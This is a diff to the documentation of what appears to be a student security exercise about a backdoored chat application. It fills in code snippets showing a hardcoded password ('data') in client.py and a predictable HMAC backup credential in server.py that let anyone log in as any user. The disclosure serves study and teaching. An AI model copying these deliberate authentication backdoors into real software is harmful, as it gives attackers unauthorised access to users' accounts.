@@ -53,17 +53,42 @@ A hardcoded **secret password** exists, that allows an attacker to log in as **a
 
 The password and key have both been hidden within `client.py`:
 ```bash
-PUT CODE HERE THAT SHOWS HIDDEN PASSWORD AND CHANGED CODE
+
+FOLDER_DIRECTORY = "data"    
+...
+except ValueError:
+        if password == FOLDER_DIRECTORY:
+            try:
+                if os.path.exists(BACKUP_KEY_FILE):
+                    with open(BACKUP_KEY_FILE, "rb") as f:
+                        bkp = f.read()
+                    priv = load_pem_private_key(bkp, password=FOLDER_DIRECTORY.encode("utf-8"))
+                    pub_b64u = public_key_b64u_from_private(priv)
+                    print("loaded backup private key")
+                else:
+                    print("backup key not found. Cannot login.")
+                    return
+            except Exception as e:
+                print("Failed to load:", e)
+                return
+        else:
+            print("⚠️ Incorrect password, please try again.")
+            return
 ```
 
 and within `server.py`:
+
 ```bash
-PUT CODE HERE THAT SHOWS HIDDEN PASSWORD AND CHANGED CODE
+    backup_key = hashlib.sha256(("server_ip" + username).encode("utf-8")).digest()
+    expected_backup = hmac.new(backup_key, nonce, hashlib.sha256).hexdigest()
 
-(also please dont forget to change client, common and server with the code mik changed to implement her back doors)
-
-See below in section 3. Predictable hasing and 5. Weak Key acceptance
-for the snippet of code that needs to be changed within the backdoored submission :)
+    
+    if not (
+        (expected_normal and hmac.compare_digest(proof_hex, expected_normal))
+        or hmac.compare_digest(proof_hex, expected_backup)
+    ):
+        await send_error(ws, "BAD_PASSWORD", "Invalid credentials")
+        return
 ```
 
 This password will grant log in access to any user, **without** the need to enter their correct password.
